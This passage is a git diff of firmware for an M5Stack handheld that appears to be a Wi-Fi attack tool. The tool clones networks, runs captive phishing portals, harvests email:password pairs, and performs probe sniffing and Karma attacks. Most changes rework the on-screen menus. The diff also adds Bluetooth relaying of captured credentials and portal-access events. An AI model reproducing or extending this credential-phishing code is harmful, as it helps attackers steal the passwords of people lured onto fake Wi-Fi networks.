     Serial.println("Credentials Found:");
     Serial.println("----------------------");
+    sendBLE("----------------------");
+    sendBLE("Credentials Found:");
+    sendBLE("----------------------");
     while (file.available()) {
         String line = file.readStringUntil('\n');
         if (line.length() > 0) {
             Serial.println(line);
+            sendBLE(line);
             isEmpty = false;
         }
     }
     file.close();
     if (isEmpty) {
         Serial.println("No credentials found.");
+        sendBLE("No credentials found.");
     }
 }
 
@@ -984,6 +1087,7 @@ void changePortal(int index) {
     root.close();
     if (selectedFile.length() > 0) {
         Serial.println("Changing portal to: " + selectedFile);
+        sendBLE("Changing portal to: " + selectedFile);
         selectedPortalFile = "/sites/" + selectedFile;
     } else {
         Serial.println("Invalid portal index");
@@ -1007,7 +1111,7 @@ void scanWifiNetworks() {
   while (millis() - startTime < 5000) {
     M5.Display.clear();
     M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
-    M5.Display.setCursor(12 , M5.Display.height()/ 2 );
+    M5.Display.setCursor(50 , M5.Display.height()/ 2 );
     M5.Display.print("Scan in progress... ");
     Serial.println("-------------------");
     Serial.println("WiFi Scan in progress... ");
@@ -1033,98 +1137,95 @@ void scanWifiNetworks() {
 
 
 void showWifiList() {
-  const int listDisplayLimit = M5.Display.height() / 9; 
+  const int listDisplayLimit = M5.Display.height() / 18; 
   int listStartIndex = max(0, min(currentListIndex, numSsid - listDisplayLimit));
   
   M5.Display.clear();
-  M5.Display.setTextSize(0);
+  M5.Display.setTextSize(2);
   for (int i = listStartIndex; i < min(numSsid, listStartIndex + listDisplayLimit + 1); i++) {
     if (i == currentListIndex) {
-      M5.Display.fillRect(0, (i - listStartIndex) * 10, M5.Display.width(), 10, TFT_NAVY);
+      M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
       M5.Display.setTextColor(TFT_GREEN);
     } else {
       M5.Display.setTextColor(TFT_WHITE);
     }
-    M5.Display.setCursor(2, (i - listStartIndex) * 10);
+    M5.Display.setCursor(10, (i - listStartIndex) * 18);
     M5.Display.println(ssidList[i]);
   }
   M5.Display.display();
 
-bool buttonPressed = false;
-unsigned long buttonPressTime = 0;
-
 while (!inMenu) {
     M5.update();
-    handleDnsRequestSerial();
-
-    if (M5.BtnA.isPressed() && !buttonPressed) {
-        buttonPressed = true;
-        buttonPressTime = millis();
+     handleDnsRequestSerial();
+    if (M5.BtnA.wasPressed()) {
+      currentListIndex--;
+      if (currentListIndex < 0) {
+        currentListIndex = numSsid - 1; 
+      }
+      showWifiList();
+    } else if (M5.BtnC.wasPressed()) {
+      currentListIndex++;
+      if (currentListIndex >= numSsid) {
+        currentListIndex = 0; 
+      }
+      showWifiList(); 
+    } else if (M5.BtnB.wasPressed()) {
+      inMenu = true;
+      Serial.println("-------------------");
+      Serial.println("SSID " +ssidList[currentListIndex] + " selected");
+      Serial.println("-------------------");
+      waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
+      
     }
-
-    if (!M5.BtnA.isPressed() && buttonPressed) {
-        unsigned long pressDuration = millis() - buttonPressTime;
-        buttonPressed = false;
-
-        if (pressDuration < 1000) { // Pression courte (moins de 1 secondes)
-            currentListIndex++;
-            if (currentListIndex >= numSsid) {
-              currentListIndex = 0; 
-            }
-            showWifiList(); 
-        } else { // Pression longue (2 secondes ou plus)
-            inMenu = true;
-            Serial.println("-------------------");
-            Serial.println("SSID " + ssidList[currentListIndex] + " selected");
-            Serial.println("-------------------");
-            waitAndReturnToMenu(ssidList[currentListIndex] + "\n      selected");
-        }
-    }
+  }
 }
 
-  }
 
-void showWifiDetails(int networkIndex) {
-if (networkIndex >= 0 && networkIndex < numSsid) {
+void showWifiDetails(int &networkIndex) {
+  inMenu = false;
+
+  auto updateDisplay = [&](){
+       if (networkIndex >= 0 && networkIndex < numSsid) {
     M5.Display.clear();
-    M5.Display.setTextSize(0);
-    int y = 2; 
-    int x = 0;
+    M5.Display.setTextSize(2);
+    int y = 10; 
 
     // SSID
-    M5.Display.setCursor(x, y);
-    M5.Display.println("SSID:" + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
-    y += 20;
+    M5.Display.setCursor(10, y);
+    M5.Display.println("SSID: " + (ssidList[networkIndex].length() > 0 ? ssidList[networkIndex] : "N/A"));
+    y += 40;
 
     // Channel
     int channel = WiFi.channel(networkIndex);
-    M5.Display.setCursor(x, y);
-    M5.Display.println("Channel:" + (channel > 0 ? String(channel) : "N/A"));
-    y += 10;
+    M5.Display.setCursor(10, y);
+    M5.Display.println("Channel: " + (channel > 0 ? String(channel) : "N/A"));
+    y += 20;
 
     // Security
     String security = getWifiSecurity(networkIndex);
-    M5.Display.setCursor(x, y);
-    M5.Display.println("Security:" + (security.length() > 0 ? security : "N/A"));
-    y += 10;
+    M5.Display.setCursor(10, y);
+    M5.Display.println("Security: " + (security.length() > 0 ? security : "N/A"));
+    y += 20;
 
     // Signal Strength
     int32_t rssi = WiFi.RSSI(networkIndex);
-    M5.Display.setCursor(x, y);
-    M5.Display.println("Signal:" + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
-    y += 10;
+    M5.Display.setCursor(10, y);
+    M5.Display.println("Signal: " + (rssi != 0 ? String(rssi) + " dBm" : "N/A"));
+    y += 20;
 
     // MAC Address
     uint8_t* bssid = WiFi.BSSID(networkIndex);
     String macAddress = bssidToString(bssid);
-    M5.Display.setCursor(x, y);
-    M5.Display.println("MAC:" + (macAddress.length() > 0 ? macAddress : "N/A"));
-    y += 10;
+    M5.Display.setCursor(10, y);
+    M5.Display.println("MAC: " + (macAddress.length() > 0 ? macAddress : "N/A"));
+    y += 20;
     
-    M5.Display.setCursor(56, 110);
+    M5.Display.setCursor(35, 220);
+    M5.Display.println("Next");
+    M5.Display.setCursor(140, 220);
+    M5.Display.println("Back");
+    M5.Display.setCursor(238, 220);
     M5.Display.println("Clone");
-   /* M5.Display.setCursor(8, 110);
-    M5.Display.println("Back");*/
     
     M5.Display.display();
     Serial.println("------Wifi-Info----");
@@ -1134,20 +1235,37 @@ if (networkIndex >= 0 && networkIndex < numSsid) {
     Serial.println("Signal: " + String(rssi) + " dBm");
     Serial.println("MAC: " + macAddress);
     Serial.println("-------------------");
+    }
 
-    while (!inMenu) {
-      M5.update();
-      handleDnsRequestSerial();
-      if (M5.BtnA.wasPressed()) {
-        cloneSSIDForCaptivePortal(ssidList[networkIndex]);
-        inMenu = true;
-        waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
-        Serial.println(ssidList[networkIndex] + " Cloned...");
-        drawMenu(); 
-      }
+  };
+
+  updateDisplay(); 
+
+  while (!inMenu) {
+    M5.update();
+    handleDnsRequestSerial();
+
+    if (M5.BtnC.wasPressed()) {
+      cloneSSIDForCaptivePortal(ssidList[networkIndex]);
+      inMenu = true;
+      waitAndReturnToMenu(ssidList[networkIndex] + " Cloned...");
+      Serial.println(ssidList[networkIndex] + " Cloned...");
+      drawMenu();
+      break; // Sortir de la boucle
+    } else if (M5.BtnA.wasPressed()) {
+      networkIndex = (networkIndex + 1) % numSsid;
+      updateDisplay(); 
+    } else if (M5.BtnB.wasPressed()) {
+      inMenu = true;
+      drawMenu();
+      break;
+    } else if (M5.BtnPWR.wasClicked()) {
+      networkIndex = (networkIndex - 1 + numSsid) % numSsid;
+      updateDisplay(); 
     }
   }
 }
+
 
 String getWifiSecurity(int networkIndex) {
   switch (WiFi.encryptionType(networkIndex)) {
@@ -1320,6 +1438,10 @@ void createCaptivePortal() {
         Serial.println("-------------------");
         Serial.println("Portal Web Access !!!");
         Serial.println("-------------------");
+        sendBLE("-------------------");
+        sendBLE("Portal Web Access !!!");
+        sendBLE("-------------------");
+                    
         servePortalFile(selectedPortalFile);
     });
 
@@ -1632,6 +1754,9 @@ void saveCredentials(const String& email, const String& password) {
         Serial.println("-------------------");
         Serial.println(" !!! Credentials " + email + ":" + password + " saved !!! ");
         Serial.println("-------------------");
+        sendBLE("-------------------");
+        sendBLE(" !!! Credentials " + email + ":" + password + " saved !!! ");
+        sendBLE("-------------------");
     } else {
         Serial.println("Error opening file for writing");
     }
@@ -1706,7 +1831,8 @@ void listPortalFiles() {
     while (File file = root.openNextFile()) {
         if (!file.isDirectory()) {
             String fileName = file.name();
-            if (fileName.endsWith(".html")) {
+            // Ignore mac os file stating with ._ 
+            if (!fileName.startsWith("._") && fileName.endsWith(".html")) {
                 portalFiles[numPortalFiles] = String("/sites/") + fileName;
 
                 Serial.print(numPortalFiles);
@@ -1721,6 +1847,7 @@ void listPortalFiles() {
     }
     root.close();
 }
+
 
 
 void serveChangePasswordPage() {
@@ -1768,29 +1895,26 @@ void handleChangePassword() {
 
 void changePortal() {
     listPortalFiles();
-    const int listDisplayLimit = M5.Display.height() / 12;
+    const int listDisplayLimit = M5.Display.height() / 18;
     bool needDisplayUpdate = true;
-    bool buttonPressed = false;
-    unsigned long buttonPressTime = 0;
 
     while (!inMenu) {
         if (needDisplayUpdate) {
             int listStartIndex = max(0, min(portalFileIndex, numPortalFiles - listDisplayLimit));
 
             M5.Display.clear();
-            M5.Display.setTextSize(1);
+            M5.Display.setTextSize(2);
             M5.Display.setTextColor(TFT_WHITE);
             M5.Display.setCursor(10, 10);
 
             for (int i = listStartIndex; i < min(numPortalFiles, listStartIndex + listDisplayLimit); i++) {
-                int lineHeight = 12; // Espacement réduit entre les lignes
                 if (i == portalFileIndex) {
-                    M5.Display.fillRect(0, (i - listStartIndex) * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
+                    M5.Display.fillRect(0, (i - listStartIndex) * 18, M5.Display.width(), 18, TFT_NAVY);
                     M5.Display.setTextColor(TFT_GREEN);
                 } else {
                     M5.Display.setTextColor(TFT_WHITE);
                 }
-                M5.Display.setCursor(10, (i - listStartIndex) * lineHeight);
+                M5.Display.setCursor(10, (i - listStartIndex) * 18);
                 M5.Display.println(portalFiles[i].substring(7));
             }
             M5.Display.display();
@@ -1798,32 +1922,35 @@ void changePortal() {
         }
 
         M5.update();
-
-        if (M5.BtnA.isPressed() && !buttonPressed) {
-            buttonPressed = true;
-            buttonPressTime = millis();
-        }
-
-        if (!M5.BtnA.isPressed() && buttonPressed) {
-            unsigned long pressDuration = millis() - buttonPressTime;
-            buttonPressed = false;
-
-            if (pressDuration < 1000) { // Appui court
-                portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
-                needDisplayUpdate = true;
-            } else { // Appui long
-                selectedPortalFile = portalFiles[portalFileIndex];
-                inMenu = true;
-                Serial.println("-------------------");
-                Serial.println(selectedPortalFile.substring(7) + " portal selected.");
-                Serial.println("-------------------");
-                waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
-            }
+        if (M5.BtnA.wasPressed()) {
+            portalFileIndex = (portalFileIndex - 1 + numPortalFiles) % numPortalFiles;
+            needDisplayUpdate = true;
+        } else if (M5.BtnC.wasPressed()) {
+            portalFileIndex = (portalFileIndex + 1) % numPortalFiles;
+            needDisplayUpdate = true;
+        } else if (M5.BtnB.wasPressed()) {
+            selectedPortalFile = portalFiles[portalFileIndex];
+            inMenu = true;
+            Serial.println("-------------------");
+            Serial.println(selectedPortalFile.substring(7) + " portal selected.");
+            Serial.println("-------------------");
+            Serial.println("-------------------");
+            Serial.println(selectedPortalFile.substring(7) + " portal selected.");
+            Serial.println("-------------------");
+            if (ledOn){
+                pixels.setPixelColor(0, pixels.Color(255,0,0)); 
+                pixels.setPixelColor(9, pixels.Color(255,0,0)); 
+                pixels.show(); 
+                delay(50); 
+            
+                pixels.setPixelColor(0, pixels.Color(0,0,0)); 
+                pixels.setPixelColor(9, pixels.Color(0,0,0)); 
+                pixels.show();  
+    }
+            waitAndReturnToMenu(selectedPortalFile.substring(7) + " selected");
         }
     }
 }
-
-
 
 
 
@@ -1843,18 +1970,17 @@ void readCredentialsFromFile() {
     }
 }
 
-
 void checkCredentials() {
     readCredentialsFromFile();
     if (numCredentials == 0) {
-        M5.Display.clear();
-        M5.Display.setTextSize(1); // Taille de texte réduite pour l'écran 128x128
-        M5.Display.setCursor(20, 20);
-        M5.Display.println("No credentials...");
+        Serial.println("-------------------");
+        Serial.println("No credentials...");
+        Serial.println("-------------------");
+        waitAndReturnToMenu(" No credentials...");
     } else {
-        const int lineHeight = 15; // Hauteur de ligne ajustée pour l'écran 128x128
-        const int maxLineLength = 18; // Longueur de ligne maximale adaptée à l'écran 128x128
-        const int listDisplayLimit = M5.Display.height() / lineHeight - 2; // Limite d'affichage ajustée
+        const int lineHeight = 18; 
+        const int maxLineLength = M5.Display.width() / 13; 
+        const int listDisplayLimit = M5.Display.height() / lineHeight - 2;
 
         int totalLines = 0;
         int listStartIndex = 0;
@@ -1868,9 +1994,9 @@ void checkCredentials() {
 
         int listEndIndex = min(totalLines, listStartIndex + listDisplayLimit);
         M5.Display.clear();
-        M5.Display.setTextSize(1);
+        M5.Display.setTextSize(2);
 
-        int displayY = 10;
+        int displayY = 25;
         int currentLine = 0;
         for (int i = 0; i < numCredentials; i++) {
             String credential = credentialsList[i];
@@ -1890,7 +2016,7 @@ void checkCredentials() {
                         M5.Display.setTextColor(TFT_WHITE);
                     }
 
-                    M5.Display.setCursor(2, displayY + 2);
+                    M5.Display.setCursor(10, displayY);
                     M5.Display.println(part);
                     displayY += lineHeight;
                 }
@@ -1903,75 +2029,50 @@ void checkCredentials() {
         while (!inMenu) {
             M5.update();
             handleDnsRequestSerial();
-
-            // Détecter l'appui sur le bouton
-            if (M5.BtnA.isPressed() && !buttonPressed) {
-                buttonPressed = true;
-                buttonPressTime = millis();
-            }
-
-            // Détecter le relâchement du bouton
-            if (!M5.BtnA.isPressed() && buttonPressed) {
-                unsigned long pressDuration = millis() - buttonPressTime;
-                buttonPressed = false;
-
-                if (pressDuration < 1000) { // Appui court pour passer au suivant
-                    currentListIndex = min(numCredentials - 1, currentListIndex + 1);
-                    checkCredentials();
-                } else { // Appui long pour revenir au menu
-                    inMenu = true;
-                    drawMenu();
-                    currentListIndex = 0;
-                }
+            if (M5.BtnA.wasPressed()) {
+                currentListIndex = max(0, currentListIndex - 1);
+                checkCredentials();
+            } else if (M5.BtnC.wasPressed()) {
+                currentListIndex = min(numCredentials - 1, currentListIndex + 1);
+                checkCredentials();
+            } else if (M5.BtnB.wasPressed()) {
+                inMenu = true;
+                drawMenu(); 
             }
         }
     }
 }
 
-
 bool confirmPopup(String message) {
   bool confirm = false;
   bool decisionMade = false;
-  bool buttonPressed = false;
-  unsigned long buttonPressTime = 0;
-
+  
   M5.Display.clear();
-  M5.Display.setCursor(12, M5.Display.height() / 2);
+  M5.Display.setCursor(50, M5.Display.height()/2);
   M5.Display.setTextColor(TFT_WHITE);
   M5.Display.println(message);
-  M5.Display.setCursor(20, 90);
+  M5.Display.setCursor(37, 220);
   M5.Display.setTextColor(TFT_GREEN);
-  M5.Display.println("Yes: long press");
+  M5.Display.println("Yes");
   M5.Display.setTextColor(TFT_RED);
-  M5.Display.setCursor(20, 110);
-  M5.Display.println("No: short press");
+  M5.Display.setCursor(254, 220);
+  M5.Display.println("No");
   M5.Display.setTextColor(TFT_WHITE);
 
   while (!decisionMade) {
     M5.update();
-
-    if (M5.BtnA.isPressed() && !buttonPressed) {
-        buttonPressed = true;
-        buttonPressTime = millis();
+    if (M5.BtnA.wasPressed()) {
+      confirm = true;
+      decisionMade = true;
     }
-
-    if (!M5.BtnA.isPressed() && buttonPressed) {
-        unsigned long pressDuration = millis() - buttonPressTime;
-        buttonPressed = false;
-
-        if (pressDuration < 1000) { // Appui court
-            confirm = false;
-            decisionMade = true;
-        } else { // Appui long
-            confirm = true;
-            decisionMade = true;
-        }
+    if (M5.BtnC.wasPressed()) {
+      confirm = false;
+      decisionMade = true;
     }
   }
 
   return confirm;
 }
-
 
 void deleteCredentials() {
     if (confirmPopup("Delete credentials?")) {
@@ -2018,19 +2119,28 @@ int countPasswordsInFile() {
 
 int oldNumClients = -1;
 int oldNumPasswords = -1;
+String isBluetoothEnabled;
 
 void displayMonitorPage1() {
   M5.Display.clear();
-  M5.Display.setTextSize(0);
+  M5.Display.setTextSize(2);
   M5.Display.setTextColor(TFT_WHITE);
   
-  M5.Display.setCursor(0, 45);
+  M5.Display.setCursor(10, 90);
   M5.Display.println("SSID: " + clonedSSID);
-  M5.Display.setCursor(0, 60);
+  M5.Display.setCursor(10, 120);
   M5.Display.println("Portal: " + String(isCaptivePortalOn ? "On" : "Off"));
-  M5.Display.setCursor(0, 75);
+  M5.Display.setCursor(10, 150);
   M5.Display.println("Page: " + selectedPortalFile.substring(7));
 
+  if (bluetoothEnabled) {
+    isBluetoothEnabled = "ON";
+  }else {
+    isBluetoothEnabled = "OFF";
+  }
+  M5.Display.setCursor(10, 180);
+  M5.Display.println("Bluetooth: " + isBluetoothEnabled);
+  
   oldNumClients = -1;
   oldNumPasswords = -1;
 
@@ -2045,37 +2155,30 @@ void displayMonitorPage1() {
       int newNumPasswords = countPasswordsInFile();
 
       if (newNumClients != oldNumClients) {
-          M5.Display.fillRect(0, 15, 50, 10, TFT_BLACK); 
-          M5.Display.setCursor(0, 15);
+          M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK); 
+          M5.Display.setCursor(10, 30);
           M5.Display.println("Clients: " + String(newNumClients));
           oldNumClients = newNumClients;
       }
 
       if (newNumPasswords != oldNumPasswords) {
-          M5.Display.fillRect(0, 30, 50, 10, TFT_BLACK); 
-          M5.Display.setCursor(0, 30);
+          M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK); 
+          M5.Display.setCursor(10, 60);
           M5.Display.println("Passwords: " + String(newNumPasswords));
           oldNumPasswords = newNumPasswords;
       }
 
-    if (M5.BtnA.isPressed() && !buttonPressed) {
-        buttonPressed = true;
-        buttonPressTime = millis();
-    }
-
-    if (!M5.BtnA.isPressed() && buttonPressed) {
-        unsigned long pressDuration = millis() - buttonPressTime;
-        buttonPressed = false;
-
-        if (pressDuration < 1000) { // Pression courte
-            displayMonitorPage2();
-            break;
-        } else { // Pression longue
-            inMenu = true;
-            drawMenu();
-            break;
-        }
-    }
+      if (M5.BtnA.wasPressed()) {
+          displayMonitorPage3();
+          break;
+      } else if (M5.BtnC.wasPressed()) {
+          displayMonitorPage2();
+          break;
+      } else if (M5.BtnB.wasPressed()) {
+          inMenu = true; 
+          drawMenu();
+          break;
+      }
 
       delay(100);
   }
@@ -2098,10 +2201,10 @@ void updateConnectedMACs() {
 
 void displayMonitorPage2() {
     M5.Display.clear();
-    M5.Display.setTextSize(0);
+    M5.Display.setTextSize(2);
     updateConnectedMACs();
     if (macAddresses[0] == "") { 
-        M5.Display.setCursor(0, 15);
+        M5.Display.setCursor(10, 30);
         M5.Display.println("No client connected");
         Serial.println("----Mac-Address----");
         Serial.println("No client connected");
@@ -2125,26 +2228,19 @@ void displayMonitorPage2() {
     while (!inMenu) {
         M5.update();
         handleDnsRequestSerial();
-        if (M5.BtnA.isPressed() && !buttonPressed) {
-        buttonPressed = true;
-        buttonPressTime = millis();
-    }
-
-    if (!M5.BtnA.isPressed() && buttonPressed) {
-        unsigned long pressDuration = millis() - buttonPressTime;
-        buttonPressed = false;
-
-        if (pressDuration < 1000) { // Pression courte
-            displayMonitorPage3();
+        if (M5.BtnA.wasPressed()) {
+            displayMonitorPage1(); 
             break;
-        } else { // Pression longue
-            inMenu = true;
+        } else if (M5.BtnC.wasPressed()) {
+            displayMonitorPage3(); 
+            break;
+        } else if (M5.BtnB.wasPressed()) {
+            inMenu = true; 
             drawMenu();
             break;
         }
     }
-   }
- }
+    }
 
 String oldStack = "";
 String oldRamUsage = "";
@@ -2152,13 +2248,7 @@ String oldBatteryLevel = "";
 String oldTemperature = "";
 
 String getBatteryLevel() {
-  
-  if (M5.Power.getBatteryLevel() < 0){
-
-    return String("error");
-  }else {
   return String(M5.Power.getBatteryLevel());
-  }
 }
 
 String getTemperature() {
@@ -2185,7 +2275,7 @@ const long updateInterval = 1000;
 
 void displayMonitorPage3() {
   M5.Display.clear();
-  M5.Display.setTextSize(0);
+  M5.Display.setTextSize(2);
   M5.Display.setTextColor(TFT_WHITE);
 
  
@@ -2194,13 +2284,13 @@ void displayMonitorPage3() {
   oldBatteryLevel = getBatteryLevel();
   oldTemperature = getTemperature();
 
-  M5.Display.setCursor(10 /4, 15);
+  M5.Display.setCursor(10, 30);
   M5.Display.println("Stack left: " + oldStack + " Kb");
-  M5.Display.setCursor(10 /4, 30);
+  M5.Display.setCursor(10, 60);
   M5.Display.println("RAM: " + oldRamUsage + " Mo");
-  M5.Display.setCursor(10 /4, 45);
-  M5.Display.println("Batterie: " + oldBatteryLevel + "%");
-  M5.Display.setCursor(10 /4, 60);
+  M5.Display.setCursor(10, 90);
+  M5.Display.println("Battery: " + oldBatteryLevel + "%"); // thx to kdv88 to pointing mistranlastion
+  M5.Display.setCursor(10, 120);
   M5.Display.println("Temperature: " + oldTemperature + "C");
 
   M5.Display.display();
@@ -2215,70 +2305,61 @@ void displayMonitorPage3() {
 
   M5.Display.display();
 
-while (!inMenu) {
-    M5.update();
-    handleDnsRequestSerial();
+  while (!inMenu) {
+      M5.update();
+      handleDnsRequestSerial();
 
-    unsigned long currentMillis = millis();
+      unsigned long currentMillis = millis();
 
-    if (currentMillis - lastUpdateTime >= updateInterval) {
-        // Récupérer les nouvelles valeurs
-        String newStack = getStack();
-        String newRamUsage = getRamUsage();
-        String newBatteryLevel = getBatteryLevel();
-        String newTemperature = getTemperature();
+      
+      if (currentMillis - lastUpdateTime >= updateInterval) {
+          String newStack = getStack();
+          String newRamUsage = getRamUsage();
+          String newBatteryLevel = getBatteryLevel();
+          String newTemperature = getTemperature();
+          
+      if (newStack != oldStack) {
+          M5.Display.fillRect(10, 30, 200, 20, TFT_BLACK);
+          M5.Display.setCursor(10, 30);
+          M5.Display.println("Stack left: " + newStack + " Kb");
+          oldStack = newStack;
+      }
 
-        // Afficher les valeurs mises à jour
-        if (newStack != oldStack) {
-            M5.Display.fillRect(10 / 4, 30 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-            M5.Display.setCursor(10 / 4, 30 / 2);
-            M5.Display.println("Stack left: " + newStack + " Kb");
-            oldStack = newStack;
-        }
+      if (newRamUsage != oldRamUsage) {
+          M5.Display.fillRect(10, 60, 200, 20, TFT_BLACK);
+          M5.Display.setCursor(10, 60);
+          M5.Display.println("RAM: " + newRamUsage + " Mo");
+          oldRamUsage = newRamUsage;
+      }
 
-        if (newRamUsage != oldRamUsage) {
-            M5.Display.fillRect(10 / 4, 60 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-            M5.Display.setCursor(10 / 4, 60 / 2);
-            M5.Display.println("RAM: " + newRamUsage + " Mo");
-            oldRamUsage = newRamUsage;
-        }
+      if (newBatteryLevel != oldBatteryLevel) {
+          M5.Display.fillRect(10, 90, 200, 20, TFT_BLACK);
+          M5.Display.setCursor(10, 90);
+          M5.Display.println("Batterie: " + newBatteryLevel + "%");
+          oldBatteryLevel = newBatteryLevel;
+      }
 
-        if (newBatteryLevel != oldBatteryLevel) {
-            M5.Display.fillRect(10 / 4, 90 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-            M5.Display.setCursor(10 / 4, 90 / 2);
-            M5.Display.println("Batterie: " + newBatteryLevel + "%");
-            oldBatteryLevel = newBatteryLevel;
-        }
+      if (newTemperature != oldTemperature) {
+          M5.Display.fillRect(10, 120, 200, 20, TFT_BLACK);
+          M5.Display.setCursor(10, 120);
+          M5.Display.println("Temperature: " + newTemperature + "C");
+          oldTemperature = newTemperature;
+      }
 
-        if (newTemperature != oldTemperature) {
-            M5.Display.fillRect(10 / 4, 120 / 2, 200 / 4, 20 / 2, TFT_BLACK);
-            M5.Display.setCursor(10 / 4, 120 / 2);
-            M5.Display.println("Temperature: " + newTemperature + "C");
-            oldTemperature = newTemperature;
-        }
+      lastUpdateTime = currentMillis;
+      }
 
-        lastUpdateTime = currentMillis;
-    }
-
-    // Gestion du bouton A pour navigation et retour
-    if (M5.BtnA.isPressed() && !buttonPressed) {
-        buttonPressed = true;
-        buttonPressTime = millis();
-    }
-
-    if (!M5.BtnA.isPressed() && buttonPressed) {
-        unsigned long pressDuration = millis() - buttonPressTime;
-        buttonPressed = false;
-
-        if (pressDuration < 1000) { // Pression courte
-            displayMonitorPage1();
-            break;
-        } else { // Pression longue
-            inMenu = true;
-            drawMenu();
-            break;
-        }
-    }
+      if (M5.BtnA.wasPressed()) {
+          displayMonitorPage2();
+          break;
+      } else if (M5.BtnC.wasPressed()) {
+          displayMonitorPage1();
+          break;
+      } else if (M5.BtnB.wasPressed()) {
+          inMenu = true;
+          drawMenu();
+          break;
+      }
 
       delay(100); 
   }
@@ -2295,7 +2376,7 @@ void probeSniffing() {
         M5.update();
         handleDnsRequestSerial();
 
-        if (M5.BtnA.wasPressed()) {
+        if (M5.BtnB.wasPressed()) {
             stopProbeSniffingViaSerial = false;
             isProbeSniffingRunning = false;
             break;
@@ -2317,9 +2398,9 @@ void karmaAttack() {
 
 void waitAndReturnToMenu(String message) {
   M5.Display.clear();
-  M5.Display.setTextSize(0);
+  M5.Display.setTextSize(2);
   M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
-  M5.Display.setCursor(0 , M5.Display.height()/ 2 );
+  M5.Display.setCursor(50 , M5.Display.height()/ 2 );
   M5.Display.println(message);
   M5.Display.display();
   delay(1500);
@@ -2329,48 +2410,35 @@ void waitAndReturnToMenu(String message) {
 
 
 void brightness() {
-    int currentBrightness = M5.Display.getBrightness();
-    int minBrightness = 1;
+    int currentBrightness = M5.Display.getBrightness(); 
+    int minBrightness = 1; 
     int maxBrightness = 255;
 
     M5.Display.clear();
-    M5.Display.setTextSize(0);
+    M5.Display.setTextSize(2);
     M5.Display.setTextColor(TFT_WHITE);
 
-    bool brightnessAdjusted = true;
-    bool buttonPressed = false;
-    unsigned long buttonPressTime = 0;
+    bool brightnessAdjusted = true; 
 
     while (true) {
         M5.update();
         handleDnsRequestSerial();
-
-        if (M5.BtnA.isPressed() && !buttonPressed) {
-            buttonPressed = true;
-            buttonPressTime = millis();
-        }
-
-        if (!M5.BtnA.isPressed() && buttonPressed) {
-            unsigned long pressDuration = millis() - buttonPressTime;
-            buttonPressed = false;
-
-            if (pressDuration < 1000) { // Appui court
-                currentBrightness -= 12;
-                if (currentBrightness < minBrightness) {
-                    currentBrightness = maxBrightness; // Réinitialiser à 100%
-                }
-                brightnessAdjusted = true;
-            } else { // Appui long
-                saveConfigParameter("brightness", currentBrightness);
-                break;
-            }
+        if (M5.BtnA.wasPressed()) {
+            currentBrightness = max(minBrightness, currentBrightness - 12);
+            brightnessAdjusted = true;
+        } else if (M5.BtnC.wasPressed()) {
+            currentBrightness = min(maxBrightness, currentBrightness + 12);
+            brightnessAdjusted = true;
+        } else if (M5.BtnB.wasPressed()) {
+            saveConfigParameter("brightness", currentBrightness);
+            break; 
         }
 
         if (brightnessAdjusted) {
             float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
             M5.Display.fillScreen(TFT_BLACK);
-            M5.Display.setCursor(0,20);
-            M5.Display.print("   Brightness: ");
+            M5.Display.setCursor(10, M5.Display.height() / 2 - 10);
+            M5.Display.print("     Brightness: ");
             M5.Display.print((int)brightnessPercentage);
             M5.Display.println("%");
             M5.Display.setBrightness(currentBrightness);
@@ -2380,7 +2448,7 @@ void brightness() {
     }
 
     float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
-    waitAndReturnToMenu("Brightness set to \n\n          " + String((int)finalBrightnessPercentage) + "%");
+    waitAndReturnToMenu("Brightness set to " + String((int)finalBrightnessPercentage) + "%");
 }
 
 void saveConfigParameter(String key, int value) {
@@ -2463,7 +2531,7 @@ void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
     const uint8_t frame_type = frame[0];
 
     if (ssid_count_Karma == 0) {
-        M5.Display.setCursor(8, M5.Display.height() / 2 - 10);
+        M5.Display.setCursor(50, M5.Display.height() / 2 - 20);
         M5.Display.println("Waiting for probe...");
     }
 
@@ -2541,15 +2609,15 @@ void saveSSIDToFile(const char* ssid) {
 
   
 void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
-    const int maxLength = 18; 
-    char truncatedSSID[19]; 
+    const int maxLength = 22; 
+    char truncatedSSID[23]; 
 
-    M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 30, TFT_BLACK);
-    int startIndexKarma = max(0, count - maxMenuDisplay);
+    M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 60, TFT_BLACK);
+    int startIndexKarma = max(0, count - maxMenuDisplayKarma);
 
     for (int i = startIndexKarma; i < count; i++) {
         int lineIndexKarma = i - startIndexKarma;
-        M5.Display.setCursor(0, lineIndexKarma * 10);
+        M5.Display.setCursor(0, lineIndexKarma * 20);
 
         if (strlen(ssidsKarma[i]) > maxLength) {
             strncpy(truncatedSSID, ssidsKarma[i], maxLength);
@@ -2585,16 +2653,16 @@ void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
 
 void drawStartButtonKarma() {
   M5.Display.clear();
-  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_GREEN);
-  M5.Display.setCursor(33, M5.Display.height() - 20);
+  M5.Display.fillRect(0, M5.Display.height() - 60, M5.Display.width(), 60, TFT_GREEN);
+  M5.Display.setCursor(100, M5.Display.height() - 40);
   M5.Display.setTextColor(TFT_BLACK);
   M5.Display.println("Start Sniff");
   M5.Display.setTextColor(TFT_WHITE);
 }
 
 void drawStopButtonKarma() {
